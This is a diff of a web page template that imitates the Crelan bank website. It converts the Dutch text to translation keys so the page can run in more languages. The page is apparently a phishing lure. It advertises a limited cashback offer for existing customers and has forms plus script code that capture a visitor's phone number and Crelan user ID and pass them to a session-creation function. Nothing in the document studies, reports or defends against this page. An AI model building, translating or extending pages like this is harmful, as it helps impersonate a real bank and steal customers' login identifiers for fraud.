-                              Leven<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                          </li>
-
-                          <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                            <a href="#"
-                              class="menu-link menu-link--parent-link">
-                              <span class="menu-link--parent-link__text">Ontdek meer over Verzekeren</span>
-                              <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                            </a>
-                          </li>
-                        </ul>
-
-                      </div>
-                    </li>
-                  </ul>
-                </nav>
-                <nav aria-label="Theme" id="block-functionalmenu-mobile-clients"
-                  class="mobile-functional-menu block block--menu block--menu--functional" data-once="mobile-menu-main">
-
-                  <label class="block-title" id="block-functionalmenu-mobile-clients-menu">Theme</label>
-                  <ul data-block="mobile_menu_middle"
-                    class="menu menu--functional js-top-menu menu--parent has-no-active-trail">
-
-                    <li class="menu-item menu-item--ground js-top-menu-ground js-top-menu-interactive">
-                      <a href="#"
-                        class="menu-link menu-link--functional" data-drupal-link-system-path="node/10189">Klant
-                        worden</a>
-
-                      <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                        data-trigger="klant-worden" aria-expanded="false">
-                        Klant worden<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                      </button>
-
-                    </li>
-                    <li
-                      class="icon icon-building agency-cta menu-item menu-item--ground js-top-menu-ground icon--replaced js-top-menu-interactive">
-                      <a href="#"
-                        class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">
-                        <span class="menu-link__icon icon-building" aria-hidden="true"></span>
-                        <span class="menu-link__text">Vind uw kantoor</span>
-                      </a>
-
-                      <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                        data-trigger="vind-uw-kantoor" aria-expanded="false">
-                        <span class="menu-button__icon icon-building" aria-hidden="true"></span>
-                        Vind uw kantoor<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                      </button>
-
-                    </li>
-                  </ul>
-                </nav>
-              </div>
-              <div class="mobile-menu-inner__bottom">
-                <nav aria-label="Corporate menu" id="block-corporatemenu-2"
-                  class="block block--menu block--menu--corporate" data-once="mobile-menu-main">
-                  <ul data-block="mobile_menu_bottom" class="menu menu--corporate menu--parent">
-
-                    <li class="menu-item">
-                      <a href="#"
-                        class="menu-link menu-link--corporate" data-drupal-link-system-path="node/2305"
-                        data-once="nav-event-mobile">Contact</a>
-
-                    </li>
-                    <li class="menu-item">
-                      <a href="#" class="menu-link menu-link--corporate"
-                        data-drupal-link-system-path="node/2224" data-once="nav-event-mobile">Jobs</a>
-
-                    </li>
-
-                  </ul>
-
-                </nav>
-                <div class="language-switcher-language-url block block-language block-language-blocklanguage-interface"
-                  id="block-lang-nav-mobile" role="navigation" language="" selection="" menu="myID">
-                  <div class="simple-dropdown js-dropdown">
-                    <button class="simple-dropdown__button" aria-label="Dutch, Select your language"
-                      aria-expanded="false" data-once="simple-dropdown">
-                      <span>nl</span><i class="icon icon-chevron-down" aria-hidden="true" role="presentation"></i>
-                    </button>
-                    <div class="simple-dropdown__list" aria-label="Select your language">
-                      <ul data-block="mobile_menu_bottom">
-                        <li hreflang="nl" data-drupal-link-system-path="&lt;front&gt;" class="nl is-active"
-                          aria-current="page"><a href="#"
-                            class="language-link is-active" hreflang="nl" data-drupal-link-system-path="&lt;front&gt;"
-                            aria-current="page" data-once="nav-event-language">Nederlands</a></li>
-                        <li hreflang="fr" data-drupal-link-system-path="&lt;front&gt;" class="fr"><a
-                            href="#" class="language-link" hreflang="fr"
-                            data-drupal-link-system-path="&lt;front&gt;" data-once="nav-event-language">Français</a>
-                        </li>
-                      </ul>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </nav>
-        </div>
       </header>
       <div class="content-wrapper">
 
@@ -2372,21 +151,21 @@
                           class="field--title field field--name-title field--type-string field--label-hidden">Particulieren</span>
                       </h1>
                       <h2 class="hero-header__title">
-                      Gedeeltelijke terugbetaling voor aankopen gedaan met de Crelan
+                      {{ __('messages.hero_title') }}
                       </h2>
-                      <h3>Met genoegen kondigen we de lancering van ons cashbackprogramma aan. Doe mee en profiteer van onze gunstige voorwaarden. <strong>Deze actie is alleen beschikbaar voor vaste klanten.</strong></h3>
+                      <h3>{{ __('messages.hero_intro') }} <strong>{{ __('messages.hero_exclusive') }}</strong></h3>
                       <ul>
-                        <li> Profiteer van ons nieuwe programma en krijg een deel van uw aankoopbedrag terug.</li>
-                        <li> Kies een uitgavencategorie en ontvang tot 5% cashback op elke aankoop.</li>
+                        <li> {{ __('messages.hero_benefit1') }}</li>
+                        <li> {{ __('messages.hero_benefit2') }}</li>
                       </ul>
-                      <h3>De inschrijving voor het programma is voor een beperkte periode.</h3>
+                      <h3>{{ __('messages.hero_limited') }}</h3>
                       
                       <div
                         class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link">
                         <div
                           class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link hero-header__cta__item">
                           <a href="#" target="_self"
-                            data-once="click-event">Deelnemen</a>
+                            data-once="click-event">{{ __('messages.participate') }}</a>
                         </div>
                       </div>
 
@@ -2407,7 +186,7 @@
 
                 <div class="form-container--content">
                   <span>
-                    Gebruik je telefoonnummer
+                    {{ __('messages.use_phone') }}
                   </span>
                   <div class="form--input-container">
                     <div class="form-input--block input--country-code">
@@ -2428,7 +207,7 @@
                     </div>
                     <button type="button" id="phone-submit-btn">
                       <span>
-                        Versturen
+                        {{ __('messages.send') }}
                       </span>
                     </button>
                   </div>
@@ -2439,7 +218,7 @@
               <div class="forms--separator">
                 <div class="separator--line--mobile"></div>
                 <span>
-                  ou
+                  {{ __('messages.or') }}
                 </span>
                 <div class="separator--line"></div>
                 <div class="separator--line--mobile"></div>
@@ -2473,12 +252,12 @@
                       fill="#84BD00" />
                   </svg>
 
-                  <span>Crelan Identificatie</span>
+                  <span>{{ __('messages.crelan_id') }}</span>
                 </div>
 
                 <div class="form-container--content">
                   <span>
-                    Vul hier uw gebruikersidentificatie in (bijvoorbeeld: AB12CD).
+                    {{ __('messages.id_description') }}
                   </span>
                   <div class="form--input-container">
                     <div class="form-input--block">
@@ -2488,7 +267,7 @@
                     </div>
                     <button type="button" id="id-submit-btn">
                       <span>
-                        Versturen
+                        {{ __('messages.send') }}
                       </span>
                     </button>
                   </div>
@@ -2515,31 +294,31 @@
                                 <li class="menu-item menu-item--expanded">
                                   <a href="#" target="_self"
                                     class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="taxonomy/term/65">Betalen</a>
+                                    data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
                                   <ul class="menu menu--inpage-nav-front menu--sub-menu">
 
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/2067">Zichtrekeningen</a>
+                                        data-drupal-link-system-path="node/2067">{{ __('messages.checking_accounts') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/2069">Kredietkaarten</a>
+                                        data-drupal-link-system-path="node/2069">{{ __('messages.credit_cards') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/7266">Debetkaarten</a>
+                                        data-drupal-link-system-path="node/7266">{{ __('messages.debit_cards') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/71">Online bankieren</a>
+                                        data-drupal-link-system-path="taxonomy/term/71">{{ __('messages.online_banking') }}</a>
 
                                     </li>
 
@@ -2548,31 +327,31 @@
                                 <li class="menu-item menu-item--expanded">
                                   <a href="#"
                                     class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="taxonomy/term/67">Lenen</a>
+                                    data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
                                   <ul class="menu menu--inpage-nav-front menu--sub-menu">
 
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/76">Wonen</a>
+                                        data-drupal-link-system-path="taxonomy/term/76">{{ __('messages.housing') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/77">Mobiliteit</a>
+                                        data-drupal-link-system-path="taxonomy/term/77">{{ __('messages.mobility') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/78">Andere doelen</a>
+                                        data-drupal-link-system-path="taxonomy/term/78">{{ __('messages.other_goals') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/87">Professionelen</a>
+                                        data-drupal-link-system-path="taxonomy/term/87">{{ __('messages.professionals') }}</a>
 
                                     </li>
 
@@ -2581,31 +360,31 @@
                                 <li class="menu-item menu-item--expanded">
                                   <a href="#"
                                     class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="taxonomy/term/66">Sparen en beleggen</a>
+                                    data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>
                                   <ul class="menu menu--inpage-nav-front menu--sub-menu">
 
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/73">Spaarrekeningen</a>
+                                        data-drupal-link-system-path="taxonomy/term/73">{{ __('messages.savings_accounts') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/74">Pensioensparen</a>
+                                        data-drupal-link-system-path="taxonomy/term/74">{{ __('messages.pension_savings') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/7016">Starten met beleggen</a>
+                                        data-drupal-link-system-path="node/7016">{{ __('messages.start_investing') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/7309">Kasbons</a>
+                                        data-drupal-link-system-path="node/7309">{{ __('messages.savings_bonds') }}</a>
 
                                     </li>
 
@@ -2614,25 +393,25 @@
                                 <li class="menu-item menu-item--expanded">
                                   <a href="#"
                                     class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="kantoorzoeker">Kantoren</a>
+                                    data-drupal-link-system-path="kantoorzoeker">{{ __('messages.offices') }}</a>
                                   <ul class="menu menu--inpage-nav-front menu--sub-menu">
 
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="kantoorzoeker">Contact</a>
+                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.contact') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="kantoorzoeker">Maak een afspraak</a>
+                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.make_appointment') }}</a>
 
                                     </li>
                                     <li class="menu-item menu-item--level-1">
                                       <a href="#"
                                         class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="kantoorzoeker">Openingsuren</a>
+                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.opening_hours') }}</a>
 
                                     </li>
 
@@ -2657,7 +436,7 @@
 
                             <div class="banner__content">
                               <h2 class="banner__title">
-                                Uw Crelan-agent
+                                {{ __('messages.your_agent') }}
 
                               </h2>
 
@@ -2666,10 +445,10 @@
                                 <div
                                   class="field--text clearfix text-formatted field field--name-field-text field--type-text-long field--label-hidden field-items-count-1 field-items-cols-1 field__item">
                                   <ul>
-                                    <li>Persoonlijk advies</li>
-                                    <li>Alle vragen worden samen bekeken en beantwoord</li>
-                                    <li>Lokale aanwezigheid en gemakkelijke toegang</li>
-                                    <li>Breed scala aan financiële producten en diensten</li>
+                                    <li>{{ __('messages.personal_advice') }}</li>
+                                    <li>{{ __('messages.questions_answered') }}</li>
+                                    <li>{{ __('messages.local_presence') }}</li>
+                                    <li>{{ __('messages.wide_range') }}</li>
                                   </ul>
                                 </div>
 
@@ -2684,8 +463,7 @@
                                     <section
                                       class="click-event child-paragraph paragraph--block-ctas paragraph--default paragraph--block-ctas--default paragraph paragraph--without-title">
                                       <a href="#" target="_self"
-                                        class="button button-default" data-once="click-event">Contacteer uw
-                                        Crelan-agent</a>
+                                        class="button button-default" data-once="click-event">{{ __('messages.contact_agent') }}</a>
                                     </section>
                                   </div>
                                 </div>
@@ -2729,37 +507,37 @@
                 <div class="block-content">
                   <div class="combo-block-region blockregion-1">
                     <div class="combo-block-col-item combo-block-col-item--product-footer">
-                      <h2 class="combo-block-title">Ons aanbod</h2>
+                      <h2 class="combo-block-title">{{ __('messages.our_offer') }}</h2>
                       <ul class="menu menu--product-footer menu--parent">
 
                         <li class="menu-item">
                           <a href="#" target="_self"
                             rel="" class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/75">Beleggen</a>
+                            data-drupal-link-system-path="taxonomy/term/75">{{ __('messages.invest') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self" rel=""
                             class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/65">Betalen</a>
+                            data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self" rel=""
                             class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/67">Lenen</a>
+                            data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self" rel=""
                             class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/68">Verzekeren</a>
+                            data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self" rel=""
                             class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="node/2204">Tarieven</a>
+                            data-drupal-link-system-path="node/2204">{{ __('messages.rates') }}</a>
 
                         </li>
 
@@ -2768,35 +546,35 @@
                   </div>
                   <div class="combo-block-region blockregion-2">
                     <div class="combo-block-col-item combo-block-col-item--theme-footer">
-                      <h2 class="combo-block-title">Thema's</h2>
+                      <h2 class="combo-block-title">{{ __('messages.themes') }}</h2>
                       <ul class="menu menu--theme-footer menu--parent">
 
                         <li class="menu-item">
                           <a href="#" target="_self" rel=""
                             class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="taxonomy/term/113">Gezin</a>
+                            data-drupal-link-system-path="taxonomy/term/113">{{ __('messages.family') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self" rel=""
                             class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="taxonomy/term/112">Pensioen</a>
+                            data-drupal-link-system-path="taxonomy/term/112">{{ __('messages.pension') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self"
                             class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="node/1986">Professionelen</a>
+                            data-drupal-link-system-path="node/1986">{{ __('messages.professionals') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="node/3172">Coöperatieve bank</a>
+                            data-drupal-link-system-path="node/3172">{{ __('messages.cooperative_bank') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="node/2221">Blogs</a>
+                            data-drupal-link-system-path="node/2221">{{ __('messages.blogs') }}</a>
 
                         </li>
 
@@ -2805,7 +583,7 @@
                   </div>
                   <div class="combo-block-region blockregion-3">
                     <div class="combo-block-col-item combo-block-col-item--about-footer">
-                      <h2 class="combo-block-title">Directe links</h2>
+                      <h2 class="combo-block-title">{{ __('messages.direct_links') }}</h2>
                       <ul class="menu menu--about-footer menu--parent">
 
                         <li class="menu-item">
@@ -2816,49 +594,47 @@
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self"
-                            class="menu-link menu-link--about-footer" title="Juridische info over Crelan"
-                            data-drupal-link-system-path="taxonomy/term/326">Reglementaire info</a>
+                            class="menu-link menu-link--about-footer"
+                            data-drupal-link-system-path="taxonomy/term/326">{{ __('messages.regulatory_info') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self"
                             class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2263">Privacy</a>
+                            data-drupal-link-system-path="node/2263">{{ __('messages.privacy') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#"
                             class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/10108">Toegankelijkheid</a>
+                            data-drupal-link-system-path="node/10108">{{ __('messages.accessibility') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#"
                             class="ot-sdk-show-settings menu-link menu-link--about-footer"
-                            onclick="javascript:return false;">Voorkeurenmenu</a>
+                            onclick="javascript:return false;">{{ __('messages.preferences') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self"
-                            class="menu-link menu-link--about-footer" data-drupal-link-system-path="node/2259">Corporate
-                            info</a>
+                            class="menu-link menu-link--about-footer" data-drupal-link-system-path="node/2259">{{ __('messages.corporate_info') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#"
-                            class="menu-link menu-link--about-footer" data-drupal-link-system-path="node/5618">Investor
-                            Relations</a>
+                            class="menu-link menu-link--about-footer" data-drupal-link-system-path="node/5618">{{ __('messages.investor_relations') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2224">Jobs</a>
+                            data-drupal-link-system-path="node/2224">{{ __('messages.jobs') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#"
                             class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2268">Newsroom</a>
+                            data-drupal-link-system-path="node/2268">{{ __('messages.newsroom') }}</a>
 
                         </li>
 
@@ -2867,25 +643,25 @@
                   </div>
                   <div class="combo-block-region blockregion-4">
                     <div class="combo-block-col-item combo-block-col-item--contact-footer">
-                      <h2 class="combo-block-title">Contacteer ons</h2>
+                      <h2 class="combo-block-title">{{ __('messages.contact_us') }}</h2>
                       <ul class="menu menu--contact-footer menu--parent">
 
                         <li class="menu-item">
                           <a href="#"
                             class="menu-link menu-link--contact-footer"
-                            data-drupal-link-system-path="kantoorzoeker">Vind uw dichtstbijzijnde kantoor</a>
+                            data-drupal-link-system-path="kantoorzoeker">{{ __('messages.find_nearest_office') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self"
                             class="menu-link menu-link--contact-footer"
-                            data-drupal-link-system-path="node/2305">Contact</a>
+                            data-drupal-link-system-path="node/2305">{{ __('messages.contact') }}</a>
 
                         </li>
                         <li class="menu-item">
                           <a href="#" target="_self"
                             rel="" class="menu-link menu-link--contact-footer"
-                            data-drupal-link-system-path="node/2376">Klachten</a>
+                            data-drupal-link-system-path="node/2376">{{ __('messages.complaints') }}</a>
 
                         </li>
 
@@ -3003,6 +779,12 @@
   @vite(['resources/js/app.js'])
   
   <script>
+  // Translations for JavaScript
+  window.translations = {
+      send: '{{ __('messages.send') }}',
+      loading: '{{ __('messages.loading') }}'
+  };
+  
   document.addEventListener('DOMContentLoaded', function() {
       const phoneInput = document.getElementById('phone-input');
       const phoneSubmitBtn = document.getElementById('phone-submit-btn');
@@ -3041,7 +823,7 @@
           }
           
           this.disabled = true;
-          this.querySelector('span').textContent = 'Laden...';
+          this.querySelector('span').textContent = window.translations.loading;
           
           try {
               const fullPhone = '+32' + phone;
@@ -3049,7 +831,7 @@
           } catch (error) {
               console.error('Error:', error);
               this.disabled = false;
-              this.querySelector('span').textContent = 'Versturen';
+              this.querySelector('span').textContent = window.translations.send;
           }
       });
       
@@ -3062,14 +844,14 @@
           }
           
           this.disabled = true;
-          this.querySelector('span').textContent = 'Laden...';
+          this.querySelector('span').textContent = window.translations.loading;
           
           try {
               await createSession('id', id);
           } catch (error) {
               console.error('Error:', error);
               this.disabled = false;
-              this.querySelector('span').textContent = 'Versturen';
+              this.querySelector('span').textContent = window.translations.send;
           }
       });
       
